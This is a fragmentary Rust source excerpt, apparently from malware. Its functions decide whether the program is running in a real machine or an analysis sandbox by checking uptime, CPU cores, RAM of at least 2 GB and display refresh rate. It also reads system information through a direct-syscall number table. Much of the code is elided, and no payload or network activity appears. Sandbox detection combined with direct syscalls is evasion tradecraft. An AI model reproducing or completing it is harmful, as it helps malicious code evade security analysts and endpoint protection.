...
pub unsafe fn is_real_environment() -> bool {
    unsafe {
        if !check_uptime() {
...
unsafe fn check_cpu_cores() -> bool {
    unsafe {
...
unsafe fn check_ram() -> bool {
    unsafe {
        ...
        debug!(
            "[SANDBOX] RAM: {}GB ({} pages x {} bytes)",
            ram_gb, info.number_of_physical_pages, info.page_size
        );
        ram >= 0x80000000 // 2 GB
    }
}
...
unsafe fn check_display_refresh() -> bool {
    unsafe {
        ...
        let refresh =
            u32::from_le_bytes([devmode[0xB8], devmode[0xB9], devmode[0xBA], devmode[0xBB]]);
...
unsafe fn query_system_basic_info() -> Option<SystemBasicInfo> {
    unsafe {
        let table = ssn_table::syscall_table();
        if table.ssns.nt_query_system_information.ssn == 0 {
            return None;
